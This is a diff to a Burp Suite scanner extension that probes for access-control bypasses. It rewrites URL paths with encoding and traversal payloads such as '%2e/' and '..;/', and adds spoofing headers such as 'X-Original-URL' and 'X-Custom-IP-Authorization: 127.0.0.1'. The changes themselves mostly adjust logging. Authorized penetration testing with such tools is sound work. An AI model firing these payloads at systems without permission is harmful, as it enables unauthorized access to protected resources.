@@ -42,11 +42,11 @@ class BurpExtender(IBurpExtender, IScannerCheck):
             return None
         
         OldReq = self._helpers.bytesToString(baseRequestResponse.getRequest())
-        Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath()
+        Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath().rstrip("/")
         PreviousPath = '/'.join(str(Rurl).split('/')[:-1])
         LastPath = str(Rurl).split('/')[-1]
-        #self.stdout.println(PreviousPath)
-        #self.stdout.println(LastPath)
+        self.stdout.println("Scanning: "+Rurl)
+
 
         payloads = ["%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/"]
         hpayloads = ["X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath]
@@ -55,8 +55,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         for p in payloads:
             NewReq = OldReq.replace(Rurl, PreviousPath+"/"+p)
             checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
-            self.stdout.println("===========================")
-            self.stdout.println(self._helpers.analyzeRequest(checkRequestResponse).getUrl().getPath())
+
             STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
             if STT_CODE == 200:
                 results.append("Url payload: "+self._helpers.analyzeRequest(checkRequestResponse).getUrl().getPath() + " | Status code: "+str(STT_CODE))
@@ -66,9 +65,6 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         for hp in hpayloads:
             NewReq = OldReq.replace("User-Agent: ", hp+"\r\n"+"User-Agent: ")
             checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
-            self.stdout.println("===========================")
-            self.stdout.println(hp)
-            #self.stdout.println(self._helpers.analyzeRequest(checkRequestResponse).getHeaders())
             STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
             if STT_CODE == 200:
                 results.append("Header payload: "+hp + " | Status code: "+str(STT_CODE))
